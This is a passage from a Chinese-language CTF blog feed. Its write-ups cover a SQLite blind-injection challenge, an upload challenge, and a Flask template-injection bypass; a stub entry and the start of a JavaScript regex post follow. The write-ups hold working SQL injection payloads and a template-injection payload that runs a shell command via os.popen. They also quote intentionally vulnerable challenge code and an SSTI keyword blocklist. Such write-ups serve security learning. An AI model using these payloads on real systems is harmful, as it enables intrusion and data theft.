class="keyword">const</span> total_vote = results.<span class="property">data</span>.<span class="property">vote_count</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (total_vote &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                        vote_count_html.<span class="property">innerHTML</span> = <span class="string">`<span class="subst">$&#123;total_vote&#125;</span> Votes`</span></span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        vote_count_html.<span class="property">innerHTML</span> = <span class="string">`<span class="subst">$&#123;total_vote&#125;</span> Vote`</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">vote</span> (marvel) &#123;</span><br><span class="line">            <span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>()</span><br><span class="line">            formData.<span class="title function_">append</span>(<span class="string">&#x27;character&#x27;</span>, marvel)</span><br><span class="line"></span><br><span class="line">            <span class="title function_">fetch</span>(<span class="string">&#x27;/api.php&#x27;</span>, &#123;</span><br><span class="line">                <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                <span class="attr">body</span>: formData</span><br><span class="line">            &#125;)</span><br><span class="line">                .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">json</span>())</span><br><span class="line">                .<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (result.<span class="property">success</span>) &#123;</span><br><span class="line">                        <span class="title function_">fetchMarvelVotesCount</span>(marvel)</span><br><span class="line">                        <span class="title function_">alert</span>(<span class="string">&#x27;successful voting&#x27;</span>)</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="title function_">alert</span>(result.<span class="property">error</span>)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">                .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">                    <span class="title function_">alert</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">                &#125;);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        marvel.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">fetchMarvelVotesCount</span>(item)</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure><p>感觉只有一个点有搞头  /api.php</p><p>这是搞了个文件？</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>34.126.83.114:1337</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryX6nmVaSWGtDzSKE1</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>154</span><br><span class="line"></span><br><span class="line"><span class="language-applescript"><span class="comment">------WebKitFormBoundaryX6nmVaSWGtDzSKE1</span></span></span><br><span class="line"><span class="language-applescript">Content-Disposition: form-data; <span class="built_in">name</span>=<span class="string">&quot;character&quot;</span></span></span><br><span class="line"><span class="language-applescript"></span></span><br><span class="line"><span class="language-applescript">captainamerica</span></span><br><span class="line"><span class="language-applescript"><span class="comment">------WebKitFormBoundaryX6nmVaSWGtDzSKE1--</span></span></span><br></pre></td></tr></table></figure><p>先考虑一下是否存在 sql注入？这种通过上传文件来进行数据库查询 感觉很奇怪</p><p>之前那种技术好像  就是两个文件拼接来绕过 但是不知道能起的到什么特殊作用</p><p>在查询的时候整了点报错出来</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;b&gt;Fatal error&lt;<span class="regexp">/b&gt;:  Uncaught PDOException: SQLSTATE[HY000]: General error: 1 near &amp;quot;11&amp;quot;: syntax error in /</span>var<span class="regexp">/www/</span>api.php:<span class="number">75</span></span><br><span class="line">Stack trace:</span><br><span class="line">#<span class="number">0</span> <span class="regexp">/var/</span>www/api.php(<span class="number">75</span>): PDO-&amp;gt;query(<span class="string">&#x27;SELECT * FROM c...&#x27;</span>)</span><br><span class="line">#<span class="number">1</span> &#123;main&#125;</span><br><span class="line">  thrown in &lt;b&gt;<span class="regexp">/var/</span>www<span class="regexp">/api.php&lt;/</span>b&gt; on line &lt;b&gt;<span class="number">75</span>&lt;<span class="regexp">/b&gt;&lt;br /</span>&gt;</span><br></pre></td></tr></table></figure><p>继续试一下sql注入</p><p>单引号会直接导致报错</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> characters <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;ironman&#x27;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> characters <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;ironman&#x27;</span> <span class="keyword">Or</span> <span class="number">1</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select</span><br><span class="line"><span class="section">or</span></span><br><span class="line"><span class="section">--</span></span><br><span class="line">and</span><br></pre></td></tr></table></figure><p><code>&quot;</code>没被过滤 而是被转义</p><p>未被过滤</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> characters <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;ironman&#x27;</span> <span class="keyword">Or</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure><p>现在如何判断数据库？是主要问题</p><p>我们尝试了  <code>select database()</code> 但是会报错</p><p>尝试了 <code>select sqlite_version()</code> 成功了  看来数据库是sqlite</p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md</a></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api.php?<span class="attribute">character</span>=ironman&#x27; <span class="keyword">And</span> (SELECT sql <span class="keyword">FROM</span> sqlite_schema) <span class="keyword">And</span><span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure><p>接下来就是考虑一下怎么判断</p><p>可以使用时间盲注</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api.php?<span class="built_in">character</span>=captainamerica&#x27;  <span class="keyword">Or</span>  (<span class="keyword">cAse</span> <span class="keyword">When</span>(Substr(sqlite_version(),<span class="number">1</span>,<span class="number">1</span>)&gt;&#x27;<span class="number">100</span>&#x27;) <span class="keyword">Then</span> raNdomblob(<span class="number">200000</span>) <span class="keyword">Else</span> <span class="number">0</span> <span class="keyword">eNd</span>)  <span class="keyword">And</span>&#x27;<span class="number">1</span></span><br></pre></td></tr></table></figure><p>大概5s</p><p>布尔注入也可以</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">payload</span> <span class="operator">=</span> <span class="string">&quot;captainamerica&#x27; And (Substr((Select group_concat(sql) from sqlite_master),1,1)&lt;&#x27;d&#x27;) aNd &#x27;1&quot;</span></span><br></pre></td></tr></table></figure><p>然后写脚本二分就行了</p><h3 id="UploadZ"><a href="#UploadZ" class="headerlink" title="UploadZ"></a>UploadZ</h3><p>给了 .htaccess 文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;IfModule mod_rewrite.c&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="section">&lt;IfModule mod_negotiation.c&gt;</span></span><br><span class="line">        <span class="attribute">Options</span> -MultiViews</span><br><span class="line">    <span class="section">&lt;/IfModule&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">RewriteEngine</span> <span class="literal">On</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">##</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">RewriteRule</span> ^storage/temp/protected/.* index.php<span class="meta"> [L,NC]</span></span><br><span class="line">    <span class="attribute">RewriteRule</span> ^storage/app/uploads/protected/.* index.php<span class="meta"> [L,NC]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">##</span></span><br><span class="line">    <span class="comment">## White listed folders</span></span><br><span class="line">    <span class="comment">##</span></span><br><span class="line">    <span class="attribute">RewriteCond</span> <span class="variable">%&#123;REQUEST_FILENAME&#125;</span> -f</span><br><span class="line">    <span class="attribute">RewriteCond</span> <span class="variable">%&#123;REQUEST_FILENAME&#125;</span> !/storage/app/temp/.*</span><br><span class="line">    <span class="attribute">RewriteCond</span> <span class="variable">%&#123;REQUEST_FILENAME&#125;</span> !/storage/app/uploads/.*</span><br><span class="line"></span><br><span class="line">    <span class="attribute">RewriteRule</span> !^index.php index.php<span class="meta"> [L,NC]</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    <span class="attribute">RewriteCond</span> <span class="variable">%&#123;REQUEST_FILENAME&#125;</span> -f</span><br><span class="line">    <span class="attribute">RewriteCond</span> <span class="variable">%&#123;REQUEST_FILENAME&#125;</span> \.php$</span><br><span class="line">    <span class="attribute">RewriteRule</span> !^index.php index.php<span class="meta"> [L,NC]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="attribute">RewriteCond</span> <span class="variable">%&#123;REQUEST_FILENAME&#125;</span> !-f</span><br><span class="line">    <span class="attribute">RewriteRule</span> ^ index.php<span class="meta"> [L]</span></span><br><span class="line"></span><br><span class="line"><span class="section">&lt;/IfModule&gt;</span></span><br></pre></td></tr></table></figure><p>给了php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">create_temp_file</span>(<span class="params"><span class="variable">$temp</span>,<span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file_temp</span> = <span class="string">&quot;storage/app/temp/&quot;</span>.<span class="variable">$name</span>;</span><br><span class="line">    <span class="title function_ invoke__">copy</span>(<span class="variable">$temp</span>,<span class="variable">$file_temp</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$file_temp</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">gen_uuid</span>(<span class="params"><span class="variable">$length</span>=<span class="number">6</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$keys</span> = <span class="title function_ invoke__">array_merge</span>(<span class="title function_ invoke__">range</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;z&#x27;</span>), <span class="title function_ invoke__">range</span>(<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>));</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$key</span> .= <span class="variable">$keys</span>[<span class="title function_ invoke__">array_rand</span>(<span class="variable">$keys</span>)];</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$key</span>;</span><br><span class="line">&#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">move_upload</span>(<span class="params"><span class="variable">$source</span>,<span class="variable">$des</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">gen_uuid</span>();</span><br><span class="line">    <span class="variable">$des</span> = <span class="string">&quot;storage/app/uploads/&quot;</span>.<span class="variable">$name</span>.<span class="variable">$des</span>;</span><br><span class="line">    <span class="title function_ invoke__">copy</span>(<span class="variable">$source</span>,<span class="variable">$des</span>);</span><br><span class="line">    <span class="title function_ invoke__">sleep</span>(<span class="number">1</span>);<span class="comment">// for loadblance and anti brute</span></span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$source</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$des</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploadedFile&#x27;</span>]))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// get details of the uploaded file</span></span><br><span class="line">    <span class="variable">$fileTmpPath</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploadedFile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$fileName</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploadedFile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$fileNameCmps</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$fileName</span>);</span><br><span class="line">    <span class="variable">$fileExtension</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">end</span>(<span class="variable">$fileNameCmps</span>));</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    <span class="variable">$dest_path</span> = <span class="variable">$uploadFileDir</span> . <span class="variable">$newFileName</span>;</span><br><span class="line">    <span class="variable">$file_temp</span> = <span class="title function_ invoke__">create_temp_file</span>(<span class="variable">$fileTmpPath</span>, <span class="variable">$fileName</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;your file in &quot;</span>.<span class="title function_ invoke__">move_upload</span>(<span class="variable">$file_temp</span>,<span class="variable">$fileName</span>);</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;clear_cache&quot;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;rm -r storage/app/uploads/*&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="EZchall"><a href="#EZchall" class="headerlink" title="EZchall"></a>EZchall</h3><p>很明显 就是去绕 ssti</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">render_template_string(payload)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">UNALLOWED = [</span><br><span class="line"> <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>, <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;app&#x27;</span>,<span class="string">&#x27;sleep&#x27;</span>, <span class="string">&#x27;add&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;format&#x27;</span>, <span class="string">&#x27;dict&#x27;</span>, <span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;attr&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;time&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;cookies&#x27;</span>, <span class="string">&#x27;headers&#x27;</span>, <span class="string">&#x27;doc&#x27;</span>, <span class="string">&#x27;url&#x27;</span>, <span class="string">&#x27;encode&#x27;</span>, <span class="string">&#x27;decode&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;ord&#x27;</span>, <span class="string">&#x27;replace&#x27;</span>, <span class="string">&#x27;echo&#x27;</span>, <span class="string">&#x27;base&#x27;</span>, <span class="string">&#x27;self&#x27;</span>, <span class="string">&#x27;template&#x27;</span>, <span class="string">&#x27;print&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;response&#x27;</span>, <span class="string">&#x27;join&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;%s&#x27;</span>, <span class="string">&#x27;&#123;&#125;&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&quot;&#123;&#123;&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>, <span class="string">&#x27;[]&#x27;</span>,<span class="string">&quot;&#x27;&#x27;&quot;</span>,<span class="string">&#x27;&quot;&quot;&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;~&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_filter</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    <span class="built_in">input</span> = <span class="built_in">input</span>.lower()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">input</span>.count(<span class="string">&#x27;.&#x27;</span>) &gt; <span class="number">1</span> <span class="keyword">or</span> <span class="built_in">input</span>.count(<span class="string">&#x27;:&#x27;</span>) &gt; <span class="number">1</span> <span class="keyword">or</span> <span class="built_in">input</span>.count(<span class="string">&#x27;/&#x27;</span>) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">input</span>) &lt; <span class="number">115</span>:</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">input</span>:</span><br><span class="line">            <span class="keyword">if</span> char <span class="keyword">in</span> string.digits:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> UNALLOWED:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> <span class="built_in">input</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>登录这里需要绕过一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">user, passwd = <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line">user = request.form[<span class="string">&#x27;user&#x27;</span>]</span><br><span class="line">passwd = request.form[<span class="string">&#x27;passwd&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> user == <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> bdecode(passwd) == <span class="string">&#x27;pass is admin ??&#x27;</span> <span class="keyword">and</span> <span class="built_in">len</span>(passwd) == <span class="number">24</span> <span class="keyword">and</span> passwd != <span class="string">&#x27;cGFzcyBpcyBhZG1pbiA/Pw==&#x27;</span>:</span><br><span class="line">session[<span class="string">&#x27;user&#x27;</span>] = user</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>))</span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, msg=<span class="string">&#x27;Incorrect !&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br></pre></td></tr></table></figure><p>绕过方式</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cGFzcyBpcyBhZG1pbiA/Pw<span class="operator">=</span><span class="operator">=</span>  --&gt; cGFzcyBpcyBhZG1pbiA/Px<span class="operator">=</span><span class="operator">=</span></span><br></pre></td></tr></table></figure><p>可能是最后一位不重要吧</p><p>ssti 的绕过很简单</p><p><code>[&quot;__ba&quot; &quot;se__&quot;]</code> 就可以绕过</p><p>但是他这里很明显不想让你去 curl</p><p>所以我们尝试把flag写到某个地方 比如session中</p><p>payload</p><p><code>&#123;%if session.update(&#123;'f':cycler['__in' 'it__']['__glo' 'bals__']['os']['popen']('tac /flag')['re' 'ad']()&#125;&#123;%endif%&#125;</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;crewctf2022&quot;&gt;&lt;a href=&quot;#crewctf2022&quot; class=&quot;headerlink&quot; title=&quot;crewctf2022&quot;&gt;&lt;/a&gt;crewctf2022&lt;/h1&gt;&lt;p&gt;难度适中的一场比赛 很好！&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>DCTF2022</title>
    <link href="http://example.com/2022/04/18/DCTF2022/"/>
    <id>http://example.com/2022/04/18/DCTF2022/</id>
    <published>2022-04-18T00:40:36.000Z</published>
    <updated>2022-04-18T00:49:36.140Z</updated>
    
    <content type="html"><![CDATA[<p>看一道还算有趣的sql题 </p><span id="more"></span><h2 id="sql-Tutor"><a href="#sql-Tutor" class="headerlink" title="sql Tutor"></a>sql Tutor</h2><blockquote><p><a href="https://sqltutor.dragonsec.si/">https://sqltutor.dragonsec.si/</a></p></blockquote><p><img src="D:\MyBlog\b1ue0cean.github.io\source_posts\DCTF2022.assets\image-20220418084231858.png" alt="image-20220418084231858"></p><p>打开页面后着这个样子</p><p>这个地方可以执行sql语句</p><p>了你需要在 <code>...</code> 输点什么</p><p><a href="https://hussienmisbah.github.io/post/sql-tutor/">https://hussienmisbah.github.io/post/sql-tutor/</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;看一道还算有趣的sql题 &lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="sql injection" scheme="http://example.com/tags/sql-injection/"/>
    
  </entry>
  
  <entry>
    <title>前端tricks</title>
    <link href="http://example.com/2022/04/14/%E5%89%8D%E7%AB%AFtricks/"/>
    <id>http://example.com/2022/04/14/%E5%89%8D%E7%AB%AFtricks/</id>
    <published>2022-04-14T12:57:32.000Z</published>
    <updated>2022-04-20T14:42:29.792Z</updated>
    
    <content type="html"><![CDATA[<p>发现一些值得研究的知识 先开个坑</p><p><a href="https://blog.huli.tw/2022/04/14/javascript-string-regexp-magic/">https://blog.huli.tw/2022/04/14/javascript-string-regexp-magic/</a></p><span id="more"></span><h2 id="挑战1"><a href="#挑战1" class="headerlink" title="挑战1"></a>挑战1</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> regexp = <span class="regexp">/huli/g</span></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&#x27;blog.huli.tw&#x27;</span></span><br><span class="line"><span class="keyword">var</span> str2 = <span class="string">&#x27;example.huli.tw&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(regexp.<span class="title function_">test</span>(str)) <span class="comment">// ???</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(regexp.<span class="title function_">test</span>(str2)) <span class="comment">// ???</span></span><br></pre></td></tr></table></figure><p><code>test()</code>方法执行一个检索，用来查看正则表达式与指定的字符串是否匹配。返回<code>true</code>或<code>false</code>。</p><p>看上去会完全一样的 结果却大跌眼镜</p><p>不看答案先思考一下为什么</p><p>感觉可能要看一下源码？</p><p>看一下文档</p><blockquote><p>JavaScript <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp"><code>RegExp</code></a> objects are <strong>stateful</strong> when they have the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/global"><code>global</code></a> or <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/sticky"><code>sticky</code></a> flags set (e.g. <code>/foo/g</code> or <code>/foo/y</code>). They store a <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/lastIndex"><code>lastIndex</code></a> from the previous match. Using this internally, <code>test()</code> can be used to iterate over multiple matches in a string of text (with capture groups).</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> str = <span class="string">&#x27;table 